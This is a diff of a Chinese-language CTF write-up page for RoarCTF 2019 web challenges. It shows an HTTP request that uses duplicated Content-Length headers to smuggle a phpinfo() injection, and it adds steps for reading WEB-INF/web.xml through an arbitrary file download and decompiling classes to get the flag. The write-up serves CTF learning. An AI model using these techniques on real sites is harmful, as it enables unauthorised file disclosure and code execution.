@@ -65,7 +65,9 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572272252121.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572273442458.png">
-<meta property="og:updated_time" content="2019-10-28T15:11:16.191Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572353748785.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572353979564.png">
+<meta property="og:updated_time" content="2019-10-29T14:03:47.437Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;28&#x2F;Roarctf-Web-writeup&#x2F;1572272252121.png">
   <link rel="canonical" href="https://li1m.github.io/2019/10/28/Roarctf-Web-writeup/">
@@ -283,11 +285,19 @@
                 
               
 
-              <time title="Created: 2019-10-28 22:06:10 / Modified: 23:11:16" itemprop="dateCreated datePublished" datetime="2019-10-28T22:06:10+08:00">2019-10-28</time>
+              <time title="Created: 2019-10-28 22:06:10" itemprop="dateCreated datePublished" datetime="2019-10-28T22:06:10+08:00">2019-10-28</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-10-29 22:03:47" itemprop="dateModified" datetime="2019-10-29T22:03:47+08:00">2019-10-29</time>
+              </span>
             
           
 
@@ -308,7 +318,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>1.1k</span>
+              <span>1.6k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -344,6 +354,13 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /calc.php?num=phpinfo(); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">28890</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=df52311039f2f717d63d154645ddf93431564799805</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Content-Length: 9</span></span><br><span class="line"><span class="comment">Content-Length: 9	//两个C-L，用http走私</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">num=phpinfo();</span></span><br></pre></td></tr></table></figure>
 
 <p>2.easy_java</p>
+<p>这道题打开是一个登录框，考点的java web，点开登录界面的help，发现一个download，可以任意文件下载，利用WEB-INF/web.xml泄露，读取flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+
+<p><img src="1572353748785.png" alt="1572353748785"></p>
+<p><img src="1572353979564.png" alt="1572353979564"></p>
+<p>找到flag文件的关键位置，然后读这个文件，有段base64编码，解码就是flag。</p>
+<p>3.Simple Upload</p>
 
     </div>
 
@@ -487,14 +504,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">7k</span>
+    <span title="Symbols count total">8k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">6 mins.</span>
+    <span title="Reading time total">7 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
